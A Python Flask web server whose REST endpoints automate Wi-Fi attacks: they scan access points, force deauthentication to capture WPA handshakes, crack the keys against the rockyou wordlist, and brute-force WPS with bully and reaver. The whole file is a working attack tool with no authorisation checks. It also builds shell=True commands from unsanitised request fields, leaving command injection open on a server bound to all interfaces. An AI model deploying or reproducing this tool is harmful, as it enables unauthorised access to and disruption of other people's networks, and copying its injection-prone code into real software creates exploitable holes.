#!/usr/bin/env python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import os
import time
import re
import json

app = Flask(__name__)
CORS(app)

INTERFACE = "wlan0mon"  # change to your monitor interface

def run_cmd(cmd, capture=True):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    out, err = proc.communicate()
    return out, err, proc.returncode

@app.route('/api/scan', methods=['GET'])
def scan():
    # Run airodump to get APs
    out, err, code = run_cmd(f"sudo timeout 5 airodump-ng {INTERFACE} --output-format csv -w /tmp/scan 2>/dev/null")
    aps = []
    try:
        with open('/tmp/scan-01.csv', 'r') as f:
            lines = f.readlines()
        for line in lines:
            if ',' in line and 'Station' not in line:
                parts = line.split(',')
                if len(parts) > 8 and parts[0].strip() and ':' in parts[0]:
                    bssid = parts[0].strip()
                    essid = parts[13].strip().strip('"') if len(parts)>13 else 'hidden'
                    channel = parts[3].strip()
                    signal = parts[8].strip()
                    aps.append({"bssid": bssid, "essid": essid, "channel": channel, "signal": signal})
    except:
        pass
    return jsonify({"aps": aps[:20]})

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    bssid = data.get('bssid')
    channel = data.get('channel', 6)
    if not bssid:
        return jsonify({"success": False, "error": "no bssid"})
    # Start airodump
    cap_file = f"/tmp/handshake_{int(time.time())}"
    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_file} {INTERFACE} &"
    proc = subprocess.Popen(cmd, shell=True)
    time.sleep(2)
    # Deauth
    subprocess.Popen(f"sudo aireplay-ng -0 5 -a {bssid} {INTERFACE}", shell=True)
    time.sleep(10)
    proc.terminate()
    # Check handshake
    check = f"sudo aircrack-ng -J /tmp/test {cap_file}.cap 2>/dev/null | grep -q 'WPA handshake'"
    ret = subprocess.run(check, shell=True)
    if ret.returncode == 0:
        return jsonify({"success": True, "file": f"{cap_file}.cap"})
    return jsonify({"success": False, "error": "handshake not captured"})

@app.route('/api/crack', methods=['POST'])
def crack():
    data = request.json
    bssid = data.get('bssid')
    wordlist = data.get('wordlist', '/usr/share/wordlists/rockyou.txt')
    # find .cap file in /tmp with bssid (simplified – use latest)
    cap_files = [f for f in os.listdir('/tmp') if f.endswith('.cap')]
    if not cap_files:
        return jsonify({"error": "no cap file found"})
    cap_file = f"/tmp/{cap_files[-1]}"
    out, err, code = run_cmd(f"sudo aircrack-ng -w {wordlist} -b {bssid} {cap_file}")
    match = re.search(r'KEY FOUND! \[ (.*?) \]', out)
    if match:
        return jsonify({"password": match.group(1)})
    return jsonify({"error": "not found"})

@app.route('/api/wps', methods=['POST'])
def wps():
    data = request.json
    bssid = data.get('bssid')
    out, err, code = run_cmd(f"sudo bully {INTERFACE} -b {bssid} -e -v 3")
    pin_match = re.search(r'WPS PIN: (\d+)', out)
    if pin_match:
        pin = pin_match.group(1)
        out2, _, _ = run_cmd(f"sudo reaver -i {INTERFACE} -b {bssid} -p {pin} -v")
        psk_match = re.search(r'WPA PSK: (.+)', out2)
        if psk_match:
            return jsonify({"psk": psk_match.group(1)})
    return jsonify({"error": "WPS failed"})

@app.route('/api/deauth', methods=['POST'])
def deauth():
    data = request.json
    bssid = data.get('bssid')
    run_cmd(f"sudo aireplay-ng -0 3 -a {bssid} {INTERFACE}")
    return jsonify({"success": True})

if __name__ == '__main__':
    # Ensure monitor mode
    subprocess.run(f"sudo airmon-ng start {INTERFACE.replace('mon','')} 2>/dev/null", shell=True)
    app.run(host='0.0.0.0', port=5000, debug=False)